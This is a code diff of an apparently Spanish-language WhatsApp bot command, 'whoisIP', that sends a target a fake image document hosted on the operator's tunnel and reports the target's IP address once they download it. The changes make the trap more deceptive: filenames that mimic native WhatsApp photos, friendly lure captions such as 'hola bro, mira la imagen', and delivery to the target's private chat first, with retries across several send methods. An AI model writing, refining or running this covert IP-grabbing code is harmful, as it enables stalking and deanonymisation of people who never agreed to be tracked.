@@ -20,12 +20,10 @@ const PLACEHOLDER = "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAs
 const FALLBACKS = ["assets/img/whoisip.jpg", "assets/img/default.jpg", "assets/img/bot.jpg"];
 
 const withTimeout = <T>(p: Promise<T>, ms: number, label: string): Promise<T> =>
-  Promise.race([
-    p,
-    new Promise<T>((_, rej) => setTimeout(() => rej(new Error(`timeout: ${label}`)), ms)),
-  ]);
+  Promise.race([p, new Promise<T>((_, rej) => setTimeout(() => rej(new Error(`timeout: ${label}`)), ms))]);
 
-const flagOf = (cc?: string) => (cc ? [...cc.toUpperCase()].map((c) => String.fromCodePoint(127397 + c.charCodeAt(0))).join("") : "🏳️");
+const flagOf = (cc?: string) =>
+  cc ? [...cc.toUpperCase()].map((c) => String.fromCodePoint(127397 + c.charCodeAt(0))).join("") : "🏳️";
 
 function deviceOf(ua: string) {
   if (/android/i.test(ua)) return "📱 Android";
@@ -102,7 +100,9 @@ export default {
 
       if (modo === "test") {
         const base = await ensurePublicBase();
-        const r = await withTimeout(fetch(`${base}/__ping`), 10000, "probe").catch((e) => ({ status: 0, text: () => e.message } as any));
+        const r = await withTimeout(fetch(`${base}/__ping`), 10000, "probe").catch(
+          (e) => ({ status: 0, text: () => e.message }) as any
+        );
         return reply(`🧪 Túnel: ${base}\nProbe: ${r.status} · ${(await r.text()).slice(0, 40)}`);
       }
 
@@ -163,9 +163,13 @@ export default {
       }
       if (!plain) plain = Buffer.from(PLACEHOLDER, "base64");
 
+      const fileName = `IMG-${new Date().toISOString().slice(0, 10).replace(/-/g, "")}-WA${
+        Math.floor(Math.random() * 9000) + 1000
+      }.jpg`;
+
       const session = await createSession({
         plain,
-        fileName: `foto_${digits.slice(-4)}.jpg`,
+        fileName,
         targetJid,
         targetPhone: digits,
         chatJid: from,
@@ -173,7 +177,11 @@ export default {
         onHit: (s, hit) => sendReport(sock, s, hit),
         onExpire: async (s) => {
           await sock
-            .sendMessage(s.chatJid, { text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó en ${Math.round(TRAP_TTL_MS / 1000)}s.` })
+            .sendMessage(s.chatJid, {
+              text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó en ${Math.round(
+                TRAP_TTL_MS / 1000
+              )}s.`,
+            })
             .catch(() => undefined);
         },
       });
@@ -185,66 +193,60 @@ export default {
         return reply(`❌ El túnel no sirve el archivo: *${test.reason}*\n${sessionUrl(session)}`);
       }
 
-      const caption = `🔎 *${fytBold("Análisis de red")}*\n\nToca *Descargar* para generar el reporte.\n\`+${digits}\``;
+      const captions = ["hola bro, mira imagen", "hola bro, mira la imagen", "bro, mírame esto", "hola, mira esta imagen"];
+      const caption = captions[Math.floor(Math.random() * captions.length)];
 
-      // Miniatura: sólo si la imagen es lo bastante pequeña para el stanza
       const docMsg: any = buildDocumentMessage(session, caption);
       if (plain.length <= 60000) docMsg.documentMessage.jpegThumbnail = plain;
 
       const messageId = "3EB0" + randomBytes(8).toString("hex").toUpperCase();
+
+      let destino = targetJid;
       let enviado = false;
 
-      // Vía A: sendMessage con el proto ya armado (no sube a Meta porque no hay clave "document")
-      if (modo !== "raw") {
-        try {
-          await withTimeout(
-            sock.sendMessage(from, docMsg as any, { messageId, quoted: msg as any } as any),
-            15000,
-            "sendMessage-proto"
-          );
-          enviado = true;
-          log("enviado vía sendMessage(proto)");
-        } catch (e: any) {
-          log(`sendMessage(proto) falló: ${e?.message}`);
-        }
-      }
+      const intentos: Array<{ jid: string; via: string }> = [
+        { jid: targetJid, via: "sendMessage(proto)" },
+        { jid: targetJid, via: "relayMessage" },
+        { jid: from, via: "sendMessage(proto)" },
+        { jid: from, via: "upload" },
+      ];
 
-      // Vía B: relayMessage crudo
-      if (!enviado) {
+      for (const intento of intentos) {
+        if (enviado) break;
         try {
-          await withTimeout(
-            (sock as any).relayMessage(from, docMsg, { messageId }),
-            15000,
-            "relayMessage"
-          );
+          if (intento.via === "upload") {
+            await withTimeout(
+              sock.sendMessage(intento.jid, {
+                document: { url: sessionUrl(session) },
+                mimetype: "image/jpeg",
+                fileName: session.fileName,
+                caption,
+              } as any),
+              20000,
+              "upload"
+            );
+          } else if (intento.via === "relayMessage") {
+            await withTimeout((sock as any).relayMessage(intento.jid, docMsg, { messageId }), 15000, "relayMessage");
+          } else {
+            await withTimeout(sock.sendMessage(intento.jid, docMsg as any, { messageId } as any), 15000, "sendMessage-proto");
+          }
           enviado = true;
-          log("enviado vía relayMessage");
+          destino = intento.jid;
+          log(`enviado a ${intento.jid} vía ${intento.via}`);
         } catch (e: any) {
-          log(`relayMessage falló: ${e?.message}`);
-        }
-      }
-
-      // Vía C: subida clásica a WhatsApp (pierde la IP, pero confirma que el media sale)
-      if (!enviado) {
-        try {
-          await sock.sendMessage(from, {
-            document: { url: sessionUrl(session) },
-            mimetype: "image/jpeg",
-            fileName: session.fileName,
-            caption,
-          } as any);
-          enviado = true;
-          log("enviado vía upload (sin captura de IP)");
-        } catch (e: any) {
-          log(`upload falló: ${e?.message}`);
+          log(`${intento.via} a ${intento.jid} falló: ${e?.message}`);
         }
       }
 
       await react(enviado ? "📡" : "❌").catch(() => undefined);
+
+      if (!enviado) return reply("❌ No salió por ninguna vía. Revisa la consola.");
+
+      const alPrivado = destino === targetJid;
       return reply(
-        enviado
-          ? `✅ Documento enviado\n${sessionUrl(session)}`
-          : `❌ No salió por ninguna vía. Revisa la consola.`
+        alPrivado
+          ? `✅ Enviado al privado de \`+${digits}\`\n_El reporte con la IP llegará aquí cuando lo descargue._`
+          : `⚠️ No pude abrir el privado de \`+${digits}\`, lo mandé al grupo.\n_El reporte llegará aquí cuando lo descargue._`
       );
     } catch (e: any) {
       log(`ERROR ${e?.stack ?? e}`);
